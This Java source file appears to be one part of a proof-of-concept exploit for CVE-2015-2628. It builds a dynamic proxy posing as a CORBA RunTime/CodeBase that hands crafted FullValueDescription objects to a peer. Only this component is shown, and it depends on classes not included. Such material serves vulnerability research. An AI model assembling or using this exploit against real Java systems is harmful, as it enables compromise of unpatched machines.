package poc.cve_2015_2628;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;

import org.omg.SendingContext.RunTime;

import com.sun.org.omg.CORBA.ValueDefPackage.FullValueDescription;
import com.sun.org.omg.SendingContext.CodeBase;

public class Proxy implements InvocationHandler {

	
	public static final RunTime INSTANCE = createInstance( );

	
	
	@Override
	public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
		final String methodName = method.getName( );
		if( methodName.equals( "meta" ) ) {
			final String id = args[ 0 ].toString( );
			
			FullValueDescription desc = Constants.FV_DESCS.get( id );
			if( desc == null ) {
				Utils.logln( "Unreconized id: %s.", id );
				throw new AssertionError( "Unreconized id: " + id );
			}
			
			Utils.logln( "Found descriptor for id: %s.", id );
			return desc;
		}
		
		throw new AssertionError( "Unhandled method invocation: " + method );
	}

	@SuppressWarnings("rawtypes")
	private static RunTime createInstance( ) {
		final ClassLoader cl = Proxy.class.getClassLoader( );
		final Class[] interfaces = {
				RunTime.class,
				CodeBase.class
		};
		final InvocationHandler handler = new Proxy( );
		
		return ( RunTime ) java.lang.reflect.Proxy.newProxyInstance( cl, interfaces, handler );
	}
	
}
